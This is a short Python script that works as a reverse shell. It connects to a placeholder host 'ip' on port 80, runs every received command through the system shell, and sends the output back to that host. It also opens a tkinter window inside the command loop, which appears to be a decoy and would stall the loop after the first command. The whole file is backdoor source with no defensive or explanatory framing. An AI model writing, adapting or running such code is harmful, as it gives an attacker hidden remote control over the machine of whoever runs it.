from tkinter import Tk
import os, socket, subprocess, sys

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("ip", 80))

while True:
    data = s.recv(8192)
    if data:
        cmd = data.decode("UTF-8", errors="replace").strip()

        if cmd == "tell os":
            b_arr = bytearray()
            b_arr.extend(map(ord, sys.platform))
            s.send(b_arr)

        elif cmd == "close":
            s.send(b'Bye!')
            s.close()
            sys.exit()

        else:
            proc = subprocess.Popen(cmd, shell=True, \
                    stdout=subprocess.PIPE, stderr=subprocess.PIPE, \
                    stdin=subprocess.PIPE)
            STDOUT, STDERR = proc.communicate()

            to_send = bytearray()
            to_send.extend(STDOUT)
            to_send.extend(STDERR)
            s.send(to_send)
        win = Tk()
        win.mainloop()